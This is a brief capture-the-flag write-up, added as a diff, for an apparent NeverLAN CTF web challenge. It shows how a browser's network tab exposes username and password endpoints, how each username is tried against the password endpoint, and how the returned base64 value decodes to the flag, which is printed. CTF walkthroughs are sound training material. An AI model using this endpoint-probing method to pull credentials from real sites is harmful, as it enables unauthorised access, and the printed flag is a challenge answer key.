@@ -1,0 +1,21 @@
+Right Click > Inspect
+
+Network Tab
+
+Type in random username and password.
+
+"/webhooks/get_username.php" & "/webhooks/get_password.php?user=test"
+
+https://challenges.neverlanctf.com:1135/webhooks/get_username.php
+
+{"usernames":[ "AdamsFamily","Mr. Clean","Dr. Whom","JimmyOneShoe" ] }
+
+Bruteforce Usernames
+
+https://challenges.neverlanctf.com:1135/webhooks/get_password.php?user=Dr.%20Whom
+
+ZmxhZ3tEMG4ndF83cnVzN19KU30=
+
+Decode with https://www.base64decode.org/
+
+flag{D0n't_7rus7_JS}
